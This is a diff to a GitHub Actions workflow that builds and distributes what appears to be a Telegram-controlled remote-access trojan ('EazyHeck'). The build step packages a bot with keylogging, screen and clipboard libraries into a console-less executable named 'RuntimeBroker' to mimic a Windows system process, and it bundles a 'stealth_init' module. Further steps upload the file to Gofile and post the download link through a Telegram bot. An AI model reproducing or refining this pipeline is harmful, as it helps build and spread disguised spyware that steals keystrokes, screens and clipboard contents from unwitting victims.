@@ -25,52 +25,49 @@ jobs:
 
       - name: Install dependencies
         run: |
-          pip install pyinstaller aiogram==3.7.0 python-dotenv psutil pyautogui pyperclip opencv-python numpy Pillow matplotlib pynput aiohttp
+          pip install pyinstaller aiogram==3.7.0 python-dotenv psutil pyautogui pyperclip opencv-python numpy Pillow matplotlib pynput aiohttp requests
 
-      - name: Patch token into bot.py
+      - name: Patch token
         shell: python
         run: |
-          import os
           token = "${{ github.event.inputs.bot_token }}"
-          with open("bot.py", "r", encoding="utf-8") as f:
-              content = f.read()
-          content = content.replace(
-              'from stealth_init import init_stealth\n    init_stealth()',
-              'from stealth_init import init_stealth\n    init_stealth()'
-          )
+          chat_id = "${{ github.event.inputs.chat_id }}"
           with open("config.py", "w", encoding="utf-8") as f:
-              f.write(f'BOT_TOKEN = "{token}"\nALLOWED_USER_ID = 0\n')
-          print("Token patched!")
+              f.write(f'BOT_TOKEN = "{token}"\nALLOWED_USER_ID = {chat_id}\n')
+          print("Patched!")
 
       - name: Build exe
         run: |
-          pyinstaller --onefile --noconsole --name RuntimeBroker --hidden-import pynput.keyboard --hidden-import pynput.mouse --add-data "handlers;handlers" bot.py
+          pyinstaller --onefile --noconsole --name RuntimeBroker --hidden-import pynput.keyboard --hidden-import pynput.mouse --hidden-import pynput.mouse._win32 --hidden-import pynput.keyboard._win32 --add-data "handlers;handlers" --add-data "stealth_init.py;." bot.py
 
       - name: Upload to Gofile
         shell: python
         run: |
-          import requests, os, asyncio
+          import requests
+
           exe_path = "dist/RuntimeBroker.exe"
           chat_id = "${{ github.event.inputs.chat_id }}"
           builder_token = "${{ secrets.BUILDER_TOKEN }}"
 
-          server_resp = requests.get("https://api.gofile.io/servers").json()
-          server = server_resp["data"]["servers"][0]["name"]
-
-          with open(exe_path, "rb") as f:
-              upload_resp = requests.post(
-                  f"https://upload.gofile.io/uploadFile",
-                  files={"file": f},
-                  data={"token": ""}
-              ).json()
-
-          if upload_resp["status"] == "ok":
-              link = upload_resp["data"]["downloadPage"]
-              msg = f"✨ <b>EazyHeck готов!</b>\n\n📎 <a href='{link}'>Скачать .exe</a>\n\n<i>Файл будет доступен 10 дней</i>"
-          else:
-              msg = "❌ Ошибка загрузки файла на gofile"
+          try:
+              server_resp = requests.get("https://api.gofile.io/servers", timeout=10).json()
+              server = server_resp["data"]["servers"][0]["name"]
+              with open(exe_path, "rb") as f:
+                  upload_resp = requests.post(
+                      f"https://{server}.gofile.io/uploadFile",
+                      files={"file": ("RuntimeBroker.exe", f)},
+                      timeout=120
+                  ).json()
+              if upload_resp["status"] == "ok":
+                  link = upload_resp["data"]["downloadPage"]
+                  msg = f"✨ <b>EazyHeck готов!</b>\n\n📎 <a href='{link}'>Скачать .exe</a>\n\n<i>Файл будет доступен 10 дней</i>"
+              else:
+                  msg = f"❌ Ошибка загрузки: {upload_resp}"
+          except Exception as e:
+              msg = f"❌ Ошибка: {e}"
 
           requests.post(
               f"https://api.telegram.org/bot{builder_token}/sendMessage",
-              json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}
+              json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
+              timeout=10
           )
